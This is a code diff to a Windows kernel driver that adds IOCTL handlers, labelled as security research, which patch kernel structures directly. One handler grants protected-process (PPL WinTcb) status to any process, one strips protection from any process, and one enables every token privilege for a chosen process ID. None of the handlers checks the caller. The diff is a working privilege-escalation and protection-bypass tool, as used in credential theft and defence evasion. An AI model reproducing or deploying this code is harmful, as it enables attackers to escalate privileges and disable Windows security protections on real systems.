@@ -53,6 +53,9 @@ NTSTATUS DioProcessDeviceControl(PDEVICE_OBJECT, PIRP Irp);
 // Helper function to get process name
 void GetProcessImageName(PEPROCESS Process, PUNICODE_STRING ImageName);
 
+// Security research helper functions
+WINDOWS_VERSION GetWindowsVersion();
+
 extern "C"
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 {
@@ -599,6 +602,69 @@ void GetProcessImageName(PEPROCESS Process, PUNICODE_STRING ImageName)
 	}
 }
 
+// ============== Security Research Functions ==============
+
+WINDOWS_VERSION GetWindowsVersion()
+{
+	RTL_OSVERSIONINFOW info;
+	info.dwOSVersionInfoSize = sizeof(info);
+
+	NTSTATUS status = RtlGetVersion(&info);
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint((DRIVER_PREFIX "RtlGetVersion failed (0x%X)\n", status));
+		return WINDOWS_UNSUPPORTED;
+	}
+
+	KdPrint((DRIVER_PREFIX "Windows Build: %d.%d (Build %d)\n",
+		info.dwMajorVersion, info.dwMinorVersion, info.dwBuildNumber));
+
+	// Only support Windows 10/11 (major version 10)
+	if (info.dwMajorVersion != 10)
+	{
+		KdPrint((DRIVER_PREFIX "Unsupported Windows major version: %d\n", info.dwMajorVersion));
+		return WINDOWS_UNSUPPORTED;
+	}
+
+	// Map build number to version
+	switch (info.dwBuildNumber)
+	{
+	case 10240: return WINDOWS_10_1507;
+	case 10586: return WINDOWS_10_1511;
+	case 14393: return WINDOWS_10_1607;
+	case 15063: return WINDOWS_10_1703;
+	case 16299: return WINDOWS_10_1709;
+	case 17134: return WINDOWS_10_1803;
+	case 17763: return WINDOWS_10_1809;
+	case 18362: return WINDOWS_10_1903;
+	case 18363: return WINDOWS_10_1909;
+	case 19041: return WINDOWS_10_2004;
+	case 19042: return WINDOWS_10_20H2;
+	case 19043: return WINDOWS_10_21H1;
+	case 19044: return WINDOWS_10_21H2;
+	case 19045: return WINDOWS_10_22H2;
+	case 22000: return WINDOWS_11_21H2;
+	case 22621: return WINDOWS_11_22H2;
+	case 22631: return WINDOWS_11_23H2;
+	case 26100: return WINDOWS_11_24H2;
+	default:
+		// For newer builds, try to use the closest known version
+		if (info.dwBuildNumber > 26100)
+		{
+			return WINDOWS_11_24H2; // Use latest known offsets
+		}
+		else if (info.dwBuildNumber >= 22000)
+		{
+			return WINDOWS_11_21H2; // Windows 11 range
+		}
+		else if (info.dwBuildNumber >= 19041)
+		{
+			return WINDOWS_10_2004; // Windows 10 20H1+ range
+		}
+		return WINDOWS_UNSUPPORTED;
+	}
+}
+
 // ============== Driver Unload ==============
 
 void DioProcessUnload(PDRIVER_OBJECT DriverObject)
@@ -902,6 +968,184 @@ NTSTATUS DioProcessDeviceControl(PDEVICE_OBJECT, PIRP Irp)
 		response->IsCollecting = g_State.CollectionEnabled;
 		response->ItemCount = g_State.ItemCount;
 		info = sizeof(CollectionStateResponse);
+		break;
+	}
+
+	// ============== Security Research IOCTLs ==============
+
+	case IOCTL_DIOPROCESS_PROTECT_PROCESS:
+	{
+		WINDOWS_VERSION windowsVersion = GetWindowsVersion();
+		if (windowsVersion == WINDOWS_UNSUPPORTED)
+		{
+			status = STATUS_NOT_SUPPORTED;
+			KdPrint((DRIVER_PREFIX "Windows version unsupported for process protection\n"));
+			break;
+		}
+
+		auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
+		if (inputLen < sizeof(TargetProcessRequest))
+		{
+			status = STATUS_BUFFER_TOO_SMALL;
+			break;
+		}
+
+		auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
+		if (!request)
+		{
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		// Get EPROCESS
+		PEPROCESS eProcess = NULL;
+		status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &eProcess);
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed for PID %d (0x%X)\n",
+				request->ProcessId, status));
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Protecting process PID %d (EPROCESS=0x%p, Offset=0x%X)\n",
+			request->ProcessId, eProcess, PROCESS_PROTECTION_OFFSET[windowsVersion]));
+
+		// Get protection structure pointer
+		PROCESS_PROTECTION_INFO* psProtection =
+			(PROCESS_PROTECTION_INFO*)(((ULONG_PTR)eProcess) + PROCESS_PROTECTION_OFFSET[windowsVersion]);
+
+		// Read current protection values for logging
+		KdPrint((DRIVER_PREFIX "Current Protection: SigLvl=0x%02X, SectSigLvl=0x%02X, Type=%d, Signer=%d\n",
+			psProtection->SignatureLevel, psProtection->SectionSignatureLevel,
+			psProtection->Protection.Type, psProtection->Protection.Signer));
+
+		// Set protection values (PPL WinTcb-Light)
+		psProtection->SignatureLevel = 0x3E;          // SE_SIGNING_LEVEL_WINDOWS_TCB
+		psProtection->SectionSignatureLevel = 0x3C;   // SE_SIGNING_LEVEL_WINDOWS
+		psProtection->Protection.Type = 2;            // PsProtectedTypeProtectedLight
+		psProtection->Protection.Signer = 6;          // PsProtectedSignerWinTcb
+
+		KdPrint((DRIVER_PREFIX "New Protection: SigLvl=0x%02X, SectSigLvl=0x%02X, Type=%d, Signer=%d\n",
+			psProtection->SignatureLevel, psProtection->SectionSignatureLevel,
+			psProtection->Protection.Type, psProtection->Protection.Signer));
+
+		ObDereferenceObject(eProcess);
+		KdPrint((DRIVER_PREFIX "Process PID %d protected successfully\n", request->ProcessId));
+		break;
+	}
+
+	case IOCTL_DIOPROCESS_UNPROTECT_PROCESS:
+	{
+		WINDOWS_VERSION windowsVersion = GetWindowsVersion();
+		if (windowsVersion == WINDOWS_UNSUPPORTED)
+		{
+			status = STATUS_NOT_SUPPORTED;
+			KdPrint((DRIVER_PREFIX "Windows version unsupported for process unprotection\n"));
+			break;
+		}
+
+		auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
+		if (inputLen < sizeof(TargetProcessRequest))
+		{
+			status = STATUS_BUFFER_TOO_SMALL;
+			break;
+		}
+
+		auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
+		if (!request)
+		{
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		// Get EPROCESS
+		PEPROCESS eProcess = NULL;
+		status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &eProcess);
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed for PID %d (0x%X)\n",
+				request->ProcessId, status));
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Removing protection from process PID %d\n", request->ProcessId));
+
+		// Get protection structure pointer
+		PROCESS_PROTECTION_INFO* psProtection =
+			(PROCESS_PROTECTION_INFO*)(((ULONG_PTR)eProcess) + PROCESS_PROTECTION_OFFSET[windowsVersion]);
+
+		// Zero out protection
+		psProtection->SignatureLevel = 0;
+		psProtection->SectionSignatureLevel = 0;
+		psProtection->Protection.Type = 0;
+		psProtection->Protection.Signer = 0;
+		psProtection->Protection.Audit = 0;
+
+		ObDereferenceObject(eProcess);
+		KdPrint((DRIVER_PREFIX "Process PID %d unprotected successfully\n", request->ProcessId));
+		break;
+	}
+
+	case IOCTL_DIOPROCESS_ENABLE_PRIVILEGES:
+	{
+		WINDOWS_VERSION windowsVersion = GetWindowsVersion();
+		if (windowsVersion == WINDOWS_UNSUPPORTED)
+		{
+			status = STATUS_NOT_SUPPORTED;
+			KdPrint((DRIVER_PREFIX "Windows version unsupported for privilege manipulation\n"));
+			break;
+		}
+
+		auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
+		if (inputLen < sizeof(TargetProcessRequest))
+		{
+			status = STATUS_BUFFER_TOO_SMALL;
+			break;
+		}
+
+		auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
+		if (!request)
+		{
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		// Get EPROCESS
+		PEPROCESS eProcess = NULL;
+		status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &eProcess);
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed for PID %d (0x%X)\n",
+				request->ProcessId, status));
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Enabling all privileges for process PID %d\n", request->ProcessId));
+
+		// Get primary token
+		PACCESS_TOKEN pToken = PsReferencePrimaryToken(eProcess);
+		if (!pToken)
+		{
+			ObDereferenceObject(eProcess);
+			status = STATUS_UNSUCCESSFUL;
+			KdPrint((DRIVER_PREFIX "PsReferencePrimaryToken failed\n"));
+			break;
+		}
+
+		// Get privileges structure pointer
+		PPROCESS_PRIVILEGES tokenPrivs =
+			(PPROCESS_PRIVILEGES)((ULONG_PTR)pToken + PROCESS_PRIVILEGE_OFFSET[windowsVersion]);
+
+		// Enable all privileges
+		tokenPrivs->Present[0] = tokenPrivs->Enabled[0] = tokenPrivs->EnabledByDefault[0] = 0xff;
+		tokenPrivs->Present[1] = tokenPrivs->Enabled[1] = tokenPrivs->EnabledByDefault[1] = 0xff;
+		tokenPrivs->Present[2] = tokenPrivs->Enabled[2] = tokenPrivs->EnabledByDefault[2] = 0xff;
+		tokenPrivs->Present[3] = tokenPrivs->Enabled[3] = tokenPrivs->EnabledByDefault[3] = 0xff;
+		tokenPrivs->Present[4] = tokenPrivs->Enabled[4] = tokenPrivs->EnabledByDefault[4] = 0xff;
+
+		PsDereferencePrimaryToken(pToken);
+		ObDereferenceObject(eProcess);
+		KdPrint((DRIVER_PREFIX "All privileges enabled for PID %d\n", request->ProcessId));
 		break;
 	}
 
